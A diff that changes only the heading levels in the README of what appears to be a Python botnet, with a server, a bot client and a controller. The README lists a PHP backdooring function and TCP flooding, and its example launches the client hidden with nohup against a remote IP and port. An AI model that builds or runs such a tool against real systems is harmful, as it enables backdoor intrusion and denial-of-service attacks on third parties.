@@ -21,9 +21,9 @@ crash, the program automatically restarts.
 
 ---
 
-#### Features:
+## Features:
 
-##### Server:
+### Server:
 
 1. Can handle multiple connections all at once.
 1. The Controller’s connection requires a plain text password, it’s not the best
@@ -32,7 +32,7 @@ crash, the program automatically restarts.
 1. Kicks the Controller after 5 mins. (As the Server only accepts 1 controller
    at a time). _TODO: Make it 5 minutes after inactivity._
 
-##### Client:
+### Client:
 
 1. Infected PHP Backdooring Function. *(Linux Only)*
 1. TCP Flood.
@@ -52,7 +52,7 @@ crash, the program automatically restarts.
 1. Uses very less resources.
 1. Can be packaged into executables with tools like pyInstaller.
 
-##### Controller:
+### Controller:
 
 1. Handles `KeyboardInterrupts`, empty commands, etc. perfectly.
 1. Easy user interface.
@@ -61,7 +61,7 @@ crash, the program automatically restarts.
 interactive shell, it is advised to start the client in another process. This
 can be done in Linux with `nohup`.
 
-###### Example:
+## Example:
 
 ```sh
 nohup python3 client.py 15.48.158.15 1567 > /dev/null &
